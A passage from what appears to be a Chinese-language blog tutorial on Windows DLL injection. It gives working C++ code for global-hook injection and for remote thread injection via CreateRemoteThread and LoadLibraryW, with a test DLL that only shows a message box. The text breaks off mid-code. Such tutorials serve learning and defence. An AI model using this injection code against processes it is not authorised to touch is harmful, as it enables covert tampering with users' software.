为DLL创建一个数据段，然后再对程序的链接器进行设置，把指定的数据段链接为共享数据段</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>data_seg(<span class="string">&quot;mydata&quot;</span>)<span class="comment">// 相当于use mydata的这种感觉</span></span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;<span class="comment">// Hook句柄(注意与HMODULE的区别)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()<span class="comment">// 恢复默认的数据段设置</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:mydata,RWS&quot;</span>)<span class="comment">// 告诉链接器设置为RWS</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ::<span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">    <span class="comment">// 将当前钩子传递给钩子链中的下一个钩子</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookEx</span>(WH_GETMESSAGE,</span><br><span class="line">(HOOKPROC)GetMsgProc, g_hDllModule, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 直接 :: 表示从全局作用域解析</span></span><br><span class="line">::<span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在DLL的入口文件dllmain.cpp中设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">HMODULE g_hDllModule = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">// 由于进程启动或调用LoadLibrary, DLL被加载到当前进程的虚拟地址空间中, 会进入如下路由</span></span><br><span class="line">    &#123;</span><br><span class="line">        g_hDllModule = hModule;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Release，X86下生成：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235151.png" alt="image-20240127220704720"></p><p>可以发现对应文件夹下生成dll文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235238.png" alt="image-20240127220737886"></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>新建一个CPP空项目</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局钩子注入</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 声明函数指针, 返回值为BOOL, 参数值为空</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;<span class="comment">// DLL句柄</span></span><br><span class="line">typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;<span class="comment">// 设置全局钩子的句柄</span></span><br><span class="line">typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;<span class="comment">// 卸载全局钩子的句柄</span></span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 加载DLL，获得句柄实例</span></span><br><span class="line">hDll = ::<span class="built_in">LoadLibraryW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>));</span><br><span class="line">        <span class="comment">// 异常检测</span></span><br><span class="line"><span class="keyword">if</span> (hDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从hDll句柄对应文件中加载SetHook地址，并把该地址位置上的数据视为typedef_SetGlobalHook函数（返回函数指针）</span></span><br><span class="line">SetGlobalHook = (typedef_SetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;SetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (SetGlobalHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bRet = <span class="built_in">SetGlobalHook</span>();<span class="comment">// 运行函数 -- 设置全局钩子</span></span><br><span class="line"><span class="keyword">if</span> (bRet) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobal Hook Error.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 同理获取卸载全局钩子</span></span><br><span class="line">UnsetGlobalHook = (typedef_UnsetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;UnsetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (UnsetGlobalHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 卸载全局钩子</span></span><br><span class="line"><span class="built_in">UnsetGlobalHook</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook OK. \n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235344.png" alt="image-20240127223514057"></p><h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><p>远线程注入是指一个进程在另一个进程中创建线程的技术</p><p>核心函数主要如下：</p><ul><li>LoadLibrary：将指定的DLL文件动态加载到进程空间</li><li>CreateRemoteThread：在目标进程的虚拟地址空间中创建运行的线程</li></ul><p>大致原理：</p><ul><li>获得LoadLibrary函数的地址</li></ul><p>​虽然Windows的ASLR机制会使得LoadLibrary在每次开机时的地址不同，但对于同个时候Windows的kernel32.dll的加载基址在各个进程中都是相同的，因此LoadLibrary也是相同的。</p><ul><li>写入注入的DLL路径字符串</li></ul><p>​通过OpenProcess打开进程获得句柄，然后调用VirtualAllocEx在目标进程中申请一块内存空间，再调用WriteProcessMemory将恶意DLL路径写入到目标进程的空间地址中</p><h3 id="WinAPI介绍-1"><a href="#WinAPI介绍-1" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><ul><li>OpenProcess</li></ul><p>打开现有的本地进程，获得句柄</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD dwDesiredAccess,<span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandle,<span class="comment">// True =&gt; 将继承原本进程中已有的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwProcessId<span class="comment">// 要打开的进程PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><ul><li>VirtualAllocEx</li></ul><p>对指定进程的虚拟地址空间内保留、提交或更改内存的状态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID WINAPI <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE  hProcess,<span class="comment">// 进程句柄，句柄必须具有PROCESS_VM_OPERATION的权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,<span class="comment">// 指定要分配页面所需起始地址的指针，如果为NULL则表示自动分配内存</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,<span class="comment">// 分配的内存大小，以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,<span class="comment">// 内存分配类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD flProtect<span class="comment">// 要分配的页面区域的内存保护类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><ul><li>WriteProcessMemory</li></ul><p>在指定进程的指定可访问的内存区域写入数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE hProcess,<span class="comment">// 目标进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,<span class="comment">// 要写入数据的内存区域的基地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCVOID lpBuffer,<span class="comment">// 存储数据的缓冲区的基地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,<span class="comment">// 要写入的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ SIZE_T *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">    <span class="comment">// 成功则返回值不为NULL</span></span></span><br></pre></td></tr></table></figure><ul><li>CreateRemoteThread</li></ul><p>在指定进程中创建运行的线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_HANDLEhProcess,<span class="comment">// 目标进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_LPSECURITY_ATTRIBUTESlpThreadAttributes,<span class="comment">// 指向SECURITY_ATTRIBUTES结构的指针，指定了新线程的安全描述符，并确定了子进程是否可以继承返回的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_SIZE_TdwStackSize,<span class="comment">// 堆栈的初始大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPTHREAD_START_ROUTINElpStartAddress,<span class="comment">// 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示了远程进程的起始地址，该函数必须存在于远程进程中</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_LPVOIDlpParameter,<span class="comment">// 指向要传递给线程函数的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_DWRODdwCreationFlags,<span class="comment">// 控制线程创建的标志，若为0则表示线程在创建后立即执行</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_LPDWORDlpThread<span class="comment">// 指向了接收线程标识的变量的指针，如果此参数为NULL，则不返回线程标识符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h3><h4 id="生成DLL文件-1"><a href="#生成DLL文件-1" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h4><p>dllmain.cpp文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;RemoteThreadInjection&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;RemoteThreadInjection&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接生成dll</p><h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>核心函数在于远程线程注入<code>_RemoteThreadInjection</code>中：</p><ul><li>函数原型设计：我们需要得知远程线程注入的目标进程PID以及执行线程的对应DLL文件位置（采用宽字符串）</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD _RemoteThreadInjection(DWORD _Pid, LPCWSTR DllName)</span><br></pre></td></tr></table></figure><ul><li>OpenProcess打开进程获得句柄</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hprocess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _Pid);</span><br><span class="line"><span class="comment">// 异常检查</span></span><br><span class="line"><span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>VirtualAllocEx API申请内存，该内存存储</li></ul><p><code>_tcslen(DllName)</code>截取的宽字符串长度不包括字符串终止符，所以需要加1，并乘上宽字符的大小以计算出字节数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在注入的进程中申请内存</span></span><br><span class="line">_Size = (_tcslen(DllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hprocess,<span class="literal">NULL</span>,_Size,</span><br><span class="line">    MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">// 第二个参数表示分配页面所需起始地址的指针</span></span><br><span class="line">    <span class="comment">// 第四个参数是指内存分配类型，MEM_COMMIT表示在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</span></span><br><span class="line">    <span class="comment">// 第五个参数表示要分配的页面区域的内存保护，如果yem</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process Memory Allocation Error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请完之后就是使用WriteProcessMemory写数据</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hprocess, pDllAddr, DllName, _Size, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li>获取LoadLibraryW的地址</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pThread = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>创建线程，并传入参数</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hThread = ::<span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li>释放资源等操作</li></ul><p>完整源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 远程线程注入</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span><span class="comment">// 宽字符</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> DLL_PATH[] = <span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// LPCWSTR: long pointer to a wide string </span></span><br><span class="line">DWORD _RemoteThreadInjection(DWORD _Pid, LPCWSTR DllName) &#123;</span><br><span class="line"><span class="comment">// 变量声明</span></span><br><span class="line">HANDLE hprocess;<span class="comment">// 目标进程的句柄</span></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD _Size = <span class="number">0</span>;</span><br><span class="line">BOOL Write = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;<span class="comment">// 申请内存空间</span></span><br><span class="line">DWORD DllAddr = <span class="number">0</span>;</span><br><span class="line">FARPROC pThread;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">hprocess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _Pid);</span><br><span class="line"><span class="comment">// 异常检查</span></span><br><span class="line"><span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在注入的进程中申请内存</span></span><br><span class="line">_Size = (_tcslen(DllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hprocess,<span class="literal">NULL</span>,_Size,</span><br><span class="line">MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="comment">// 第二个参数表示分配页面所需起始地址的指针</span></span><br><span class="line"><span class="comment">// 第四个参数是指内存分配类型，MEM_COMMIT表示在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</span></span><br><span class="line"><span class="comment">// 第五个参数表示要分配的页面区域的内存保护，如果yem</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Process Memory Allocation Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向申请的内存写入数据</span></span><br><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hprocess, pDllAddr, DllName, _Size, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (isWriteSuccess == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Write Process Memory Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LoadLibraryW(支持宽字符)函数地址</span></span><br><span class="line">pThread = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line"><span class="comment">// LPTHREAD_START_ROUTINE 是一个函数指针类型，用于指定线程的入口点函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在目标进程中创建线程</span></span><br><span class="line">hThread = ::<span class="built_in">CreateRemoteThread</span>(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// hprocess指向了目标进程</span></span><br><span class="line"><span class="comment">// addr表示LoadLibrary的LPTHREAD_START_ROUTINE函数指针</span></span><br><span class="line"><span class="comment">// pDllAddr表示传递给线程函数的变量的对应的指针（传给LoadLibrary的变量）</span></span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Remote Thread 